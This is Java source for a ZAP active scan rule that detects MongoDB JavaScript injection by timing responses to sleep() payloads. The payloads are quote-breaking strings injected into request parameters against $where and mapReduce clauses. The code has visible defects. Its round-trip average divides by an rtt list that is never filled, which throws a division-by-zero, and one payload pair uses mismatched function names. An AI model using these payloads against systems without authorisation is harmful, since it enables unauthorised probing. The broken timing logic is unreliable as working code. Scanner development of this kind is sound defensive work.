/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2018 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.core.scanner.NameValuePair;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;

/**
 * The MongoInjection scan rule identifies MongoDB injection vulnerabilities
 *
 * @author l.casciaro
 */
public class MongoDbInjectionTimingScanRule extends AbstractAppParamPlugin {

    // Prefix for internationalised messages used by this rule
    private static final String MESSAGE_PREFIX = "ascanalpha.mongodb.";
    // Constants
    private static final String SLEEP_ATTACK = "sleep";
    private int SLEEP_SHORT_TIME, SLEEP_LONG_TIME;
    private static final String INSERT_SHORT_TIME = "INSERT_SHORT_TIME",
            INSERT_LONG_TIME = "INSERT_LONG_TIME";
    private static final int SHORT_THRESHOLD = 1500;
    private static final int LONG_THRESHOLD = 3000;

    // Packages of attack rules
    private static final String[][] SLEEP_INJECTION = {
        // Attacking $where clause
        // function() { var x = md5( some_input ); return this.password == x;}
        {
            "'); sleep(" + INSERT_SHORT_TIME + "); print('",
            "'); sleep(" + INSERT_LONG_TIME + "); print('"
        },
        {
            "\"); sleep(" + INSERT_SHORT_TIME + "); print(\"",
            "\"); sleep(" + INSERT_LONG_TIME + "); print(\""
        },
        {
            "0); sleep(" + INSERT_SHORT_TIME + "); print(\"",
            "0); sleep(" + INSERT_LONG_TIME + "); print(\""
        },
        // function() { var x = this.value == some_input; return x;}
        {
            "'; sleep(" + INSERT_SHORT_TIME + "); var x='",
            "'; sleep(" + INSERT_LONG_TIME + "); var x='"
        },
        {
            "\"; sleep(" + INSERT_SHORT_TIME + "); var x=\"",
            "\"; sleep(" + INSERT_LONG_TIME + "); var x=\""
        },
        {"0; sleep(" + INSERT_SHORT_TIME + ")", "0; sleep(" + INSERT_LONG_TIME + ")"},
        // function() { return this.value == some_input }
        {
            "zap' || sleep(" + INSERT_SHORT_TIME + ") && 'zap'=='zap",
            "zap' || sleep(" + INSERT_LONG_TIME + ") && 'zap'=='zap"
        },
        {
            "zap\" || sleep(" + INSERT_SHORT_TIME + ") && \"zap\"==\"zap",
            "zap\" || sleep(" + INSERT_LONG_TIME + ") && \"zap\"==\"zap"
        },
        {"0 || sleep(" + INSERT_SHORT_TIME + ")", "0 || sleep(" + INSERT_LONG_TIME + ")"},
        // function() { return this.value == some_function(some_imput) }
        {
            "zap') || sleep(" + INSERT_SHORT_TIME + ") && hex_md5('zap",
            "zap') || sleep(" + INSERT_LONG_TIME + ") && md5('zap"
        },
        {
            "zap\") || sleep(" + INSERT_SHORT_TIME + ") && md5(\"zap",
            "zap\") || sleep(" + INSERT_LONG_TIME + ") && md5(\"zap"
        },
        {"0)  || sleep(" + INSERT_SHORT_TIME, "0) || sleep(" + INSERT_LONG_TIME},
        // Attacking mapReduce clause (only for old versions of mongodb)
        {
            "_id);}, function(inj) { sleep("
                    + INSERT_SHORT_TIME
                    + ");return 1;}, { out: 'x'}); "
                    + "db.injection.mapReduce(function() { emit(1,1",
            "_id);}, function(inj) { sleep("
                    + INSERT_LONG_TIME
                    + "); return 1;}, { out: 'x'}); "
                    + "db.injection.mapReduce(function() { emit(1,1"
        }
    };
    // Log prints
    private static final String IO_EX_LOG = "trying to send an http message";
    private static final String STOP_LOG = "Stopping the scan due to a user request";
    private static final Logger LOGGER = LogManager.getLogger(MongoDbInjectionTimingScanRule.class);
    private static final Map<String, String> ALERT_TAGS =
            CommonAlertTag.toMap(
                    CommonAlertTag.OWASP_2021_A03_INJECTION,
                    CommonAlertTag.OWASP_2017_A01_INJECTION,
                    CommonAlertTag.WSTG_V42_INPV_05_SQLI);
    // Variables
    private boolean doTimedScan;

    @Override
    public int getCweId() {
        return 943;
    }

    @Override
    public int getWascId() {
        return 19;
    }

    @Override
    public int getId() {
        return 90039;
    }

    @Override
    public boolean targets(TechSet technologies) {
        return technologies.includes(Tech.MongoDB);
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(MESSAGE_PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    public String getExtraInfo(String attack) {
        return Constant.messages.getString(MESSAGE_PREFIX + "extrainfo." + attack);
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public void init() {
        LOGGER.debug("Initialising MongoDB penetration tests");
        switch (this.getAttackStrength()) {
            case LOW:
                SLEEP_SHORT_TIME = 1000;
                SLEEP_LONG_TIME = 2000;
                doTimedScan = true;
                break;
            default:
                SLEEP_SHORT_TIME = 1000;
                SLEEP_LONG_TIME = 3000;
                doTimedScan = true;
                break;
        }
    }

    @Override
    public void scan(HttpMessage msg, NameValuePair originalParam) {
        super.scan(msg, originalParam);
    }

    @Override
    public void scan(HttpMessage msg, String param, String value) {
        List<Integer> rtt = new ArrayList<>();
        HttpMessage msgInjAttack;

        LOGGER.debug(
                "Scanning URL [{}] [{}] on param: [{}] with value: [{}] for MongoDB Injection",
                msg.getRequestHeader().getMethod(),
                msg.getRequestHeader().getURI(),
                param,
                value);
        // injection attack to $Where and $mapReduce clauses
        // The $where clause executes associated JS function one time for each tuple --> sleep time
        // = interval * nTuples
        if (doTimedScan) {
            if (isStop()) {
                LOGGER.debug(STOP_LOG);
                return;
            }
            LOGGER.debug("Starting with the javascript code injection payloads:");
            int aveRtt = getAveRtts(rtt),
                    index = 0,
                    timeShort = SLEEP_SHORT_TIME,
                    timeLong = SLEEP_LONG_TIME;
            String phase = null;
            boolean hadTimeout = false;
            String sleepValueToInj;
            while (index < SLEEP_INJECTION.length) {
                if (isStop()) {
                    LOGGER.debug(STOP_LOG);
                    return;
                }
                LOGGER.debug("Trying  with the value: {}", SLEEP_INJECTION[index][0]);
                try {
                    msgInjAttack = getNewMsg();
                    sleepValueToInj =
                            SLEEP_INJECTION[index][0].replaceFirst(
                                    INSERT_SHORT_TIME, Integer.toString(timeShort));
                    phase = INSERT_SHORT_TIME;
                    setParameter(msgInjAttack, param, sleepValueToInj);
                    sendAndReceive(msgInjAttack, false);
                    LOGGER.debug(
                            "Trying for a longer time with the value: {}",
                            SLEEP_INJECTION[index][1]);
                    if (msgInjAttack.getTimeElapsedMillis() >= aveRtt + SHORT_THRESHOLD) {
                        phase = INSERT_LONG_TIME;
                        sleepValueToInj =
                                SLEEP_INJECTION[index][1].replaceFirst(
                                        INSERT_LONG_TIME, Integer.toString(timeLong));
                        msgInjAttack = getNewMsg();
                        setParameter(msgInjAttack, param, sleepValueToInj);
                        sendAndReceive(msgInjAttack, false);
                        if (msgInjAttack.getTimeElapsedMillis() >= aveRtt + LONG_THRESHOLD) {
                            newAlert()
                                    .setConfidence(Alert.CONFIDENCE_HIGH)
                                    .setParam(param)
                                    .setAttack(sleepValueToInj)
                                    .setOtherInfo(getExtraInfo(SLEEP_ATTACK))
                                    .setMessage(msgInjAttack)
                                    .raise();
                            break;
                        }
                    }
                    if (hadTimeout) {
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_LOW)
                                .setParam(param)
                                .setAttack(sleepValueToInj)
                                .setOtherInfo(getExtraInfo(SLEEP_ATTACK))
                                .setMessage(msgInjAttack)
                                .raise();
                        break;
                    }
                    index++;
                } catch (SocketTimeoutException ex) {
                    hadTimeout = true;
                    if (INSERT_LONG_TIME.equals(phase)) {
                        // Timeout: 40s --> 14 <= n. tuples < 40
                        timeShort /= 3;
                        timeLong /= 3;
                    } else {
                        // n. tuples >= 40
                        timeShort /= 10;
                        timeLong /= 10;
                    }
                    LOGGER.debug(
                            "Caught {} {} when {} due to socket timeout, trying with the lowest interval({})",
                            ex.getClass().getName(),
                            ex.getMessage(),
                            IO_EX_LOG,
                            timeLong);
                } catch (IOException ex) {
                    LOGGER.debug(
                            "Caught {} {} when {}",
                            ex.getClass().getName(),
                            ex.getMessage(),
                            IO_EX_LOG);
                    return;
                }
            }
        }
    }

    private static int getAveRtts(List<Integer> rtt) {
        double sum = 0;
        for (Integer i : rtt) {
            sum += i;
        }
        return (int) sum / rtt.size();
    }
}
